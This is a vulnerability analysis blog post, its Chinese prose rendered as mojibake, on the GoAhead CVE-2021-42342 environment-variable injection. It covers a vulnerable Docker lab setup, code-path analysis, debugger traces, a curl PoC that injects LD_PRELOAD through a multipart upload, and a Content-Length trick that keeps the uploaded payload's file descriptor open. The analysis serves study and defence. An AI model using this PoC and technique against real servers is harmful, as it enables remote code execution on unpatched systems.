      <title>CVE-2021-42342 Goahead ç¯å¢ƒå˜é‡æ³¨å…¥æ¼æ´åˆ†æ</title>
      <link href="CVE-2021-42342-Goahead.html"/>
      <url>CVE-2021-42342-Goahead.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h2 id="æ¼æ´èƒŒæ™¯"><a href="#æ¼æ´èƒŒæ™¯" class="headerlink" title="æ¼æ´èƒŒæ™¯"></a>æ¼æ´èƒŒæ™¯</h2><p>è¿‘æ—¥çˆ†å‡ºGoAheadå­˜åœ¨RCEæ¼æ´ï¼ˆå®é™…æ¥æºäº PBCTF çš„ä¸€é“é¢˜ç›®ï¼‰ï¼Œæ¼æ´æºäºæ–‡ä»¶ä¸Šä¼ è¿‡æ»¤å™¨çš„å¤„ç†ç¼ºé™·ï¼Œå½“ä¸CGIå¤„ç†ç¨‹åºä¸€èµ·ä½¿ç”¨æ—¶ï¼Œå¯å½±å“ç¯å¢ƒå˜é‡ï¼Œä»è€Œå¯¼è‡´RCEã€‚æ¼æ´å½±å“ç‰ˆæœ¬ä¸ºï¼š</p><ul><li>GoAhead =4.x</li><li>5.x&lt;=GoAhead&lt;5.1.5</li></ul><p>æˆ‘ä¸ºå•¥çœ‹è¿™ä¸ªæ¼æ´å‘¢ï¼Ÿæ˜¯å› ä¸º phith0n å¸ˆå‚…å‘äº†ä¸€ç¯‡å¤ç°è¸©å‘è®°ï¼Œ æˆ‘å¯¹å…¶ä¸­ä¸€å— æ–‡ä»¶æè¿°ç¬¦æ‰¾ä¸åˆ°çš„è§£å†³è¿‡ç¨‹æ¯”è¾ƒæ„Ÿå…´è¶£ã€‚äºæ˜¯å’Œ @leommxj ä¸€èµ·çœ‹äº†ä¸‹ã€‚ç„¶åç®€å•è®°å½•äº†ä¸‹è¿™äº›è¿‡ç¨‹ï¼Œæ¯”è¾ƒç®€ç•¥ã€‚</p><h2 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h2><h3 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h3><p>å‚è€ƒ phith0n çš„æ–‡ç« ï¼š <a href="https://tttang.com/archive/1399/">GoAheadç¯å¢ƒå˜é‡æ³¨å…¥å¤ç°è¸©å‘è®° - è·³è·³ç³– (tttang.com)</a></p><p>Dockerfile å¦‚ä¸‹</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> beswing/swpwn:<span class="number">18.04</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> <span class="built_in">set</span> -ex \</span></span><br><span class="line"><span class="bash">    &amp;&amp; apt-get update \</span></span><br><span class="line"><span class="bash">    &amp;&amp; apt-get install wget make gcc -y \</span></span><br><span class="line"><span class="bash">    &amp;&amp; wget -qO- https://github.com/embedthis/goahead/archive/refs/tags/v5.1.4.tar.gz | tar zx --strip-components 1 -C /usr/src/ \</span></span><br><span class="line"><span class="bash">    &amp;&amp; <span class="built_in">cd</span> /usr/src \</span></span><br><span class="line"><span class="bash">    &amp;&amp; make SHOW=1 ME_GOAHEAD_UPLOAD_DIR=<span class="string">&quot;&#x27;\&quot;/tmp\&quot;&#x27;&quot;</span> \</span></span><br><span class="line"><span class="bash">    &amp;&amp; make install \</span></span><br><span class="line"><span class="bash">    &amp;&amp; cp src/self.key src/self.crt /etc/goahead/ \</span></span><br><span class="line"><span class="bash">    &amp;&amp; mkdir -p /var/www/goahead/cgi-bin/ \</span></span><br><span class="line"><span class="bash">    &amp;&amp; apt-get purge -y --auto-remove wget make gcc \</span></span><br><span class="line"><span class="bash">    &amp;&amp; <span class="built_in">cd</span> /var/www/goahead \</span></span><br><span class="line"><span class="bash">    &amp;&amp; sed -e <span class="string">&#x27;s!^# route uri=/cgi-bin dir=cgi-bin handler=cgi$!route uri=/cgi-bin dir=/var/www/goahead handler=cgi!&#x27;</span> -i /etc/goahead/route.txt</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">80</span></span><br><span class="line"><span class="keyword">CMD</span><span class="bash"> [<span class="string">&quot;goahead&quot;</span>, <span class="string">&quot;-v&quot;</span>, <span class="string">&quot;--home&quot;</span>, <span class="string">&quot;/etc/goahead&quot;</span>, <span class="string">&quot;/var/www/goahead&quot;</span>]</span></span><br></pre></td></tr></table></figure><blockquote><p>è¿™ä¹Ÿæ˜¯è¿™ä¸ªæ¼æ´çš„ç¬¬ä¸€ä¸ªå‘ï¼š<strong>æ–°ç‰ˆæœ¬çš„GoAheadé»˜è®¤æ²¡æœ‰å¼€å¯CGIé…ç½®ï¼Œè€Œè€ç‰ˆæœ¬å¦‚æœæ²¡æœ‰cgi-binç›®å½•ï¼Œæˆ–è€…é‡Œé¢æ²¡æœ‰cgiæ–‡ä»¶ï¼Œä¹Ÿä¸å—è¿™ä¸ªæ¼æ´å½±å“ã€‚</strong>æ‰€ä»¥å¹¶ä¸åƒæŸäº›æ–‡ç« é‡Œè¯´çš„é‚£æ ·å½±å“å¹¿æ³›ã€‚</p></blockquote><h3 id="ä»£ç åˆ†æ"><a href="#ä»£ç åˆ†æ" class="headerlink" title="ä»£ç åˆ†æ"></a>ä»£ç åˆ†æ</h3><h4 id="HTTP-è¯·æ±‚æµç¨‹"><a href="#HTTP-è¯·æ±‚æµç¨‹" class="headerlink" title="HTTP è¯·æ±‚æµç¨‹"></a>HTTP è¯·æ±‚æµç¨‹</h4><p>è°ƒç”¨æ ˆå¦‚ä¸‹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#1  0x00007f44624fc11d in cgiHandler (wp&#x3D;0x55e66c994790) at src&#x2F;cgi.c:216</span><br><span class="line">#2  0x00007f446250e44b in websRunRequest (wp&#x3D;0x55e66c994790) at src&#x2F;route.c:182</span><br><span class="line">#3  0x00007f446250152c in websPump (wp&#x3D;0x55e66c994790) at src&#x2F;http.c:870</span><br><span class="line">#4  0x00007f44625013b9 in readEvent (wp&#x3D;0x55e66c994790) at src&#x2F;http.c:834</span><br><span class="line">#5  0x00007f4462501142 in socketEvent (sid&#x3D;2, mask&#x3D;2, wptr&#x3D;0x55e66c994790) at src&#x2F;http.c:772</span><br><span class="line">#6  0x00007f4462516dbf in socketDoEvent (sp&#x3D;0x55e66c994650) at src&#x2F;socket.c:654</span><br><span class="line">#7  0x00007f4462516ce5 in socketProcess () at src&#x2F;socket.c:628</span><br><span class="line">#8  0x00007f4462502f34 in websServiceEvents (finished&#x3D;0x55e66aa02014 &lt;finished&gt;) at src&#x2F;http.c:1385</span><br><span class="line">#9  0x000055e66a8005cf in main (argc&#x3D;5, argv&#x3D;0x7fff507b50c8, envp&#x3D;0x7fff507b50f8) at src&#x2F;goahead.c:170</span><br></pre></td></tr></table></figure><p>æ•´ä¸ª<code>goahead</code>å¤„ç†<code>cgi</code>æ‰€å¯¹åº”<code>post</code>è¯·æ±‚å¤„ç†æµç¨‹å°ç»“å¦‚ä¸‹ï¼š</p><ol><li><p>è°ƒç”¨<code>websRead</code>å‡½æ•°ï¼Œæ‰€æœ‰æ•°æ®ä¿å­˜åˆ°äº†wp-&gt;rxbufä¸­ã€‚</p></li><li><p>è°ƒç”¨</p><p><code>websPump</code></p><p>ï¼Œè¯¥å‡½æ•°åŒ…å«ä¸‰éƒ¨åˆ†ï¼š</p><ol><li>è°ƒç”¨<code>parseIncoming</code>å‡½æ•°è§£æè¯·æ±‚å¤´ä»¥åŠè°ƒç”¨<code>websRouteRequest</code>ç¡®å®šç›¸åº”çš„å¤„ç†å‡½æ•°ã€‚</li><li>è°ƒç”¨<code>processContent</code>å°†å¤„ç†postæ•°æ®ï¼Œå°†å…¶ä¿å­˜åˆ°tmpæ–‡ä»¶ä¸­ã€‚</li><li>è°ƒç”¨<code>websRunRequest</code>å‡½æ•°ï¼Œè°ƒç”¨ç›¸åº”çš„å¤„ç†å‡½æ•°ï¼Œcgiå¯¹åº”ä¸º<code>cgiHandler</code>ã€‚</li></ol></li><li><p>è°ƒç”¨<code>cgiHandler</code>ï¼Œå°†è¯·æ±‚å¤´ä»¥åŠgetå‚æ•°è®¾ç½®åˆ°ç¯å¢ƒå˜é‡ä¸­ï¼Œè°ƒç”¨<code>launchCgi</code>å‡½æ•°ã€‚</p></li><li><p>è°ƒç”¨<code>launchCgi</code>å‡½æ•°ï¼Œå°†æ ‡å‡†è¾“å‡ºè¾“å…¥é‡å®šå‘åˆ°æ–‡ä»¶å¥æŸ„ï¼Œè°ƒç”¨<code>execve</code>å¯åŠ¨cgiè¿›ç¨‹ã€‚</p></li></ol><h4 id="æ ¹æœ¬åŸå› ï¼ˆRoot-causeï¼‰"><a href="#æ ¹æœ¬åŸå› ï¼ˆRoot-causeï¼‰" class="headerlink" title="æ ¹æœ¬åŸå› ï¼ˆRoot causeï¼‰"></a>æ ¹æœ¬åŸå› ï¼ˆRoot causeï¼‰</h4><ol><li><code>strim</code> å‡½æ•°çš„é”™è¯¯ä½¿ç”¨</li></ol><p>strim å‡½æ•°å®šä¹‰å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">PUBLIC <span class="keyword">char</span> *<span class="title">strim</span><span class="params">(<span class="keyword">char</span> *str, cchar *<span class="built_in">set</span>, <span class="keyword">int</span> where)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span>    *s;</span><br><span class="line">    ssize   len, i;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (str == <span class="number">0</span> || <span class="built_in">set</span> == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">...</span><br><span class="line">    s = (<span class="keyword">char</span>*) &amp;str[i];</span><br><span class="line">    <span class="keyword">if</span> (where &amp; WEBS_TRIM_END) &#123;</span><br><span class="line">...</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> s;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å½“ç¬¬äºŒä¸ªå‚æ•°ä¸º 0 çš„æ—¶å€™ï¼Œ ç›´æ¥è¿”å› 0 ã€‚ç„¶è€Œ goahead çš„ cgi.c:176 è¡Œä»£ç æ˜¯è¿™æ ·ä½¿ç”¨çš„</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/202201101526090.png" title="image-20220110152602890" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/202201101526090.png" alt="image-20220110152602890"></a></p><p>é‚£ä¹ˆæ­¤å¤„ vp çš„ å€¼ä¸º 0 ï¼Œ å› æ­¤åç»­çš„ smatch åˆ¤æ–­éƒ½æ¯«æ— æ„ä¹‰ã€‚ å¦å¤–æˆ‘ä»¬æ³¨æ„åˆ° 182 å’Œ 186 è¡Œéƒ½æ˜¯è®¾ç½®ç¯å¢ƒå˜é‡ï¼Œ ç„¶è€Œ 183 è¡Œå¤„ä¼šæ‹¼æ¥ <code>CGI_</code> åˆ°å­—ç¬¦ï¼Œ å› æ­¤ä¸æ˜¯æˆ‘ä»¬æ¼æ´åˆ©ç”¨çš„ç›®æ ‡ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ME_GOAHEAD_CGI_VAR_PREFIX <span class="meta-string">&quot;CGI_&quot;</span></span></span><br></pre></td></tr></table></figure><p>å› æ­¤æˆ‘ä»¬éœ€è¦èµ°åˆ° 186 è¡Œä»£ç ï¼Œéœ€è¦ <code>s-&gt;arg</code> ä¸º 0 å³å¯ï¼ˆåˆå§‹åŒ–çŠ¶æ€ä¸º<code>0</code>ï¼‰</p><h2 id="æ¼æ´å¤ç°"><a href="#æ¼æ´å¤ç°" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h2><p>éœ€è¦åœ¨Bodyä¸­å‘é€multipartè¡¨å•ï¼Œç„¶ååœ¨åŠ«æŒç¯å¢ƒå˜é‡ã€‚ PoC å¦‚ä¸‹ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -vv -F data=@poc.so -F <span class="string">&quot;LD_PRELOAD=/proc/self/fd/7&quot;</span> http://127.0.0.1:8080/cgi-bin/test.cgi\n</span><br></pre></td></tr></table></figure><h3 id="æ‰¾ä¸åˆ°æ–‡ä»¶æè¿°ç¬¦"><a href="#æ‰¾ä¸åˆ°æ–‡ä»¶æè¿°ç¬¦" class="headerlink" title="æ‰¾ä¸åˆ°æ–‡ä»¶æè¿°ç¬¦"></a>æ‰¾ä¸åˆ°æ–‡ä»¶æè¿°ç¬¦</h3><p>åœ¨ä½¿ç”¨å¦‚ä¸Š Dockerfile ä½œä¸ºç¯å¢ƒçš„æ¼æ´åˆ©ç”¨è¿‡ç¨‹ä¸­ï¼Œä¼šå‘ç°åŠ«æŒ so çš„è¿‡ç¨‹ä¼šæœ‰å¦‚ä¸‹æŠ¥é”™</p><ul><li><code>ERROR: ld.so: object &#39;/proc/self/fd/7&#39; from LD_PRELOAD cannot be preloaded (file too short): ignored.</code></li><li><code>ERROR: ld.so: object &#39;/proc/self/fd/5&#39; from LD_PRELOAD cannot be preloaded (cannot open shared object file): ignored.</code></li><li><code>ERROR: ld.so: object &#39;/proc/self/fd/2&#39; from LD_PRELOAD cannot be preloaded (invalid ELF header): ignored.</code></li></ul><p>ç»è¿‡è°ƒè¯•å’Œä»£ç é˜…è¯»åˆ†æäº†ï¼Œå¤§è‡´åŸå› å¦‚ä¸‹ï¼š</p><p>å½“æœ€åä¸€ä¸ªåŒ…è¢«å¤„ç†çš„æ—¶å€™ï¼Œå³è¿›åˆ° <code>upload.c#processContentData</code> å‡½æ•°ä¸­</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/202201091727107.png" title="image-20220109172745897" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/202201091727107.png" alt="image-20220109172745897"></a></p><p>å³ 334 è¡Œä»£ç å¤„ï¼Œè¿›å…¥åˆ° <code>get</code> å‡½æ•°ä¸­ï¼Œæ­¤å‡½æ•°é€»è¾‘ä¸ºåˆ¤æ–­æ˜¯å¦è¯»åˆ° upload æ•°æ®çš„ç»“æŸç¬¦å·ï¼Œå³ <code>boundary </code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ SOURCE (CODE) ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line">In file: &#x2F;usr&#x2F;src&#x2F;src&#x2F;upload.c</span><br><span class="line">   419     while (cp &lt; endp) &#123;</span><br><span class="line">   420         cp &#x3D; (char *) memchr(cp, first, endp - cp);</span><br><span class="line">   421         if (!cp) &#123;</span><br><span class="line">   422             return 0;</span><br><span class="line">   423         &#125;</span><br><span class="line"> â–º 424         if (memcmp(cp, wp-&gt;boundary, wp-&gt;boundaryLen) &#x3D;&#x3D; 0) &#123;</span><br><span class="line">   425             return cp;</span><br><span class="line">   426         &#125;</span><br><span class="line">   427         cp++;</span><br><span class="line">   428     &#125;</span><br><span class="line">   429     return 0;</span><br><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ STACK ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line">00:0000â”‚ rsp 0x7ffcd8eca3e0 â€”â–¸ 0x7ffcd8eca410 â€”â–¸ 0x5590f9adce48 â—‚â€” &#39;--1544f720d6ce5bdc5b81100af0acc3b5--\r\n&#39;</span><br><span class="line">01:0008â”‚     0x7ffcd8eca3e8 â—‚â€” 0x2f &#x2F;* &#39;&#x2F;&#39; *&#x2F;</span><br><span class="line">02:0010â”‚     0x7ffcd8eca3f0 â€”â–¸ 0x5590f9adce3f â—‚â€” &#39;aaaaaa\n\r\n--1544f720d6ce5bdc5b81100af0acc3b5--\r\n&#39;</span><br><span class="line">03:0018â”‚     0x7ffcd8eca3f8 â€”â–¸ 0x5590f9adb790 â€”â–¸ 0x5590f9add5d0 â—‚â€” 0x67632f0054534f00</span><br><span class="line">04:0020â”‚     0x7ffcd8eca400 â€”â–¸ 0x7ffcd8eca410 â€”â–¸ 0x5590f9adce48 â—‚â€” &#39;--1544f720d6ce5bdc5b81100af0acc3b5--\r\n&#39;</span><br><span class="line">05:0028â”‚     0x7ffcd8eca408 â—‚â€” 0x2d005590f9adfd70</span><br><span class="line">06:0030â”‚     0x7ffcd8eca410 â€”â–¸ 0x5590f9adce48 â—‚â€” &#39;--1544f720d6ce5bdc5b81100af0acc3b5--\r\n&#39;</span><br><span class="line">07:0038â”‚     0x7ffcd8eca418 â€”â–¸ 0x5590f9adce4d â—‚â€” &#39;4f720d6ce5bdc5b81100af0acc3b5--\r\n&#39;</span><br><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ BACKTRACE ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line"> â–º f 0   0x7fb0335a7429 getBoundary+206</span><br><span class="line">   f 1   0x7fb0335a7003 processContentData+109</span><br><span class="line">   f 2   0x7fb0335a66f7 websProcessUploadData+372</span><br><span class="line">   f 3   0x7fb03358f7d4 processContent+110</span><br><span class="line">   f 4   0x7fb03358e51b websPump+104</span><br><span class="line">   f 5   0x7fb03358e3b9 readEvent+352</span><br><span class="line">   f 6   0x7fb03358e142 socketEvent+159</span><br><span class="line">   f 7   0x7fb0335a3dbf socketDoEvent+197</span><br><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line">pwndbg&gt; p cp</span><br><span class="line">$15 &#x3D; 0x5590f9adce48 &quot;--1544f720d6ce5bdc5b81100af0acc3b5--\r\n&quot;</span><br><span class="line">pwndbg&gt; p wp-&gt;boundary</span><br><span class="line">$16 &#x3D; 0x5590f9ad5a70 &quot;--1544f720d6ce5bdc5b81100af0acc3b5&quot;</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>å¦‚æœæ˜¯åˆ™è¿”å› <code>cp</code>, å› æ­¤ï¼Œå½“æ­£å¸¸çš„æ•°æ®åŒ…çš„æ—¶å€™ï¼Œæ­¤æ—¶ 334 è¡Œçš„åˆ¤æ–­ä¸æˆç«‹ï¼Œä»£ç ä¼šå¾€ä¸‹èµ°ï¼Œæœ€åèµ°åˆ° 391 ä»£ç ï¼Œclose è°ƒä¸´æ—¶æ–‡ä»¶çš„ fdï¼Œ å› æ­¤åŒ…å«çš„æ—¶å€™ä¼šæŠ¥é”™ã€‚</p><p>é‚£ä¹ˆæ€ä¹ˆè§£å†³è¿™ä¸ªé—®é¢˜å‘¢ï¼Ÿ phith0n å¸ˆå‚…æ–‡ç« ä¸­çš„è§£å†³æ–¹æ¡ˆå¦‚ä¸‹ï¼š</p><blockquote><p>é¦–å…ˆæ„é€ å¥½ä¹‹å‰é‚£ä¸ªæ— æ³•åˆ©ç”¨çš„æ•°æ®åŒ…ï¼Œå…¶ä¸­ç¬¬ä¸€ä¸ªè¡¨å•å­—æ®µæ˜¯<code>LD_PRELOAD</code>ï¼Œå€¼æ˜¯æ–‡ä»¶æè¿°ç¬¦ï¼Œä¸€èˆ¬æ˜¯<code>/proc/self/fd/7</code>ã€‚ç„¶åæˆ‘ä»¬éœ€è¦æ”¹é€ è¿™ä¸ªæ•°æ®åŒ…ï¼š</p><ul><li>ç»™payload.soæ–‡ä»¶æœ«å°¾å¢åŠ å‡ åƒä¸ªå­—èŠ‚çš„è„å­—ç¬¦ï¼Œæ¯”å¦‚è¯´<code>a</code></li><li>å…³æ‰burpsuiteè‡ªåŠ¨çš„â€œUpdate Content-Lengthâ€</li><li>å°†æ•°æ®åŒ…çš„Content-Lengthè®¾ç½®ä¸ºä¸è¶…è¿‡16384çš„å€¼ï¼Œä½†éœ€è¦æ¯”payload.soæ–‡ä»¶çš„å¤§å°è¦å¤§ä¸ª500å­—èŠ‚å·¦å³ï¼Œæˆ‘è¿™é‡Œè®¾ç½®ä¸º15000</li></ul></blockquote><p>æ„é€ å¦‚ä¸‹payloadï¼š </p><ol><li>Content-Length å°äºæ€»çš„ upload data çš„å¤§å°</li><li>Content-Length è‡³å°‘è¦å¤§äº payload.so  çš„å¤§å°</li></ol><p>é‚£ä¹ˆè¿™ä¸ªæ–¹æ³•æ˜¯å¦‚ä½•ç”Ÿæ•ˆçš„å‘¢ï¼Ÿ å½“å‡ºå‘upload åï¼Œåˆ°æ‰§è¡Œ cgiï¼Œ ç¨‹åºä»£ç ä¼šè°ƒç”¨<code>processContent</code>å°†å¤„ç†postæ•°æ®ï¼Œå°†å…¶ä¿å­˜åˆ°tmpæ–‡ä»¶ä¸­ï¼Œ å…¶ä»£ç å¦‚ä¸‹ï¼š</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/202201091921124.png" title="image-20220109192138087" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/202201091921124.png" alt="image-20220109192138087"></a></p><p>å½“ <code>wp-&gt;oef </code> ä¸ºå‡æ—¶ï¼Œ ç¨‹åºä¼šåˆ¤æ–­ post çš„æ•°æ®æœªè¯»å®Œï¼Œå› æ­¤ä¼šè¿›åˆ° <code>filterChunkData</code> å‡½æ•°ä¸­ï¼Œ å½“ç¨‹åºåˆ¤æ–­æ•°æ®å·²ç»è¯»å®Œï¼Œ</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/202201091939636.png" title="image-20220109193908584" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/202201091939636.png" alt="image-20220109193908584"></a></p><p>å³ <code>wp-&gt;rxRemainning &lt;=0</code> åï¼Œä¼šè®¾ç½® <code>wp-&gt;eof</code>  çš„å€¼ä¸º 1 ã€‚ è¿™è¡¨æ˜æ ¹æ® æ•°æ®å·²ç»æ¥å—å®Œæ¯•ï¼Œç„¶åèµ°åˆ° <code>upload.c:1216</code> è¡Œ, è°ƒç”¨ <code>websProcessUploadData </code> å‡½æ•°</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/202201091911961.png" title="image-20220109191114896" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/202201091911961.png" alt="image-20220109191114896"></a></p><p>æ‰§è¡Œåˆ°å¦‚ä¸Šå›¾ä¸­åˆ° 145 è¡Œä»£ç å¤„ï¼Œè°ƒç”¨processContentData`å‡½æ•°ï¼Œ</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/202201091944301.png" title="image-20220109194405252" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/202201091944301.png" alt="image-20220109194405252"></a></p><p>ç”±äºæˆ‘ä»¬è®¾ç½®çš„ Content-Length å°äºæ€»çš„æ•°æ®åŒ…å¤§å°ï¼Œå› æ­¤æˆ‘ä»¬æ˜¯è¯»ä¸åˆ° <code>Boundaray</code> ï¼Œå› æ­¤è¿™é‡Œ 348 ä»£ç è¿”å› 0  ã€‚</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/202201091945836.png" title="image-20220109194525781" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/202201091945836.png" alt="image-20220109194525781"></a></p><p><code>canProceed</code> ä¸ºé›¶ï¼Œä»148 ä»£ç å¤„è¿”å›åˆ° http.c:1216 è¡Œã€‚</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/202201091948266.png" title="image-20220109194835191" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/202201091948266.png" alt="image-20220109194835191"></a></p><p>ç„¶åä» 1218 è¡Œå¤„ä»£ç è¿”å›åˆ° http.c:867 è¡Œ</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/202201091949226.png" title="image-20220109194953182" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/202201091949226.png" alt="image-20220109194953182"></a></p><p>æ¥ç€ for å¾ªç¯å› ä¸º canProceed ä¸º 0 ï¼Œå› æ­¤ break é€€å‡ºå¾ªç¯ã€‚è‡³æ­¤åˆ°è¿™è¿˜æ²¡æœ‰è°ƒåˆ° cgi ï¼Œä½†ç¨‹åºçš„æ•°æ®å·²å¤„ç†å®Œä¸€éƒ¨åˆ†ã€‚ ç„¶åç¨‹åºç›´æ¥é€€å›åˆ° <code>readEvent</code>, ä¹‹åç”±äºæˆ‘ä»¬æ•°æ®åŒ…å¹¶æ²¡æœ‰å‘é€å®Œï¼Œ è¿˜æœ‰ä¸€éƒ¨åˆ†åˆ°è„æ•°æ®æœªå¤„ç†ã€‚ä»£ç åˆä¼šèµ°ä¸€é</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socketEventâ€”&gt;readEvent-&gt;websPump-&gt;processContent</span><br></pre></td></tr></table></figure><p>å½“åˆ° processContent å‡½æ•°çš„æ—¶å€™ï¼Œ</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/202201091955229.png" title="image-20220109195548187" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/202201091955229.png" alt="image-20220109195548187"></a></p><p>1209 è¡Œä»£ç ä¸æ»¡è¶³ï¼Œ 1239 è¡Œä»£ç æ»¡è¶³ï¼Œ å› æ­¤ <code>wp-&gt;state</code> è¢«è®¾ç½®ä¸º WEBS_READY ã€‚ç„¶åå† websPump ä»£ç å¤„æ‰§è¡Œ <code>websRunrequest</code>ï¼Œ æœ€åæ‰§è¡Œ CGI ã€‚</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/202201091956842.png" title="image-20220109195658790" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/202201091956842.png" 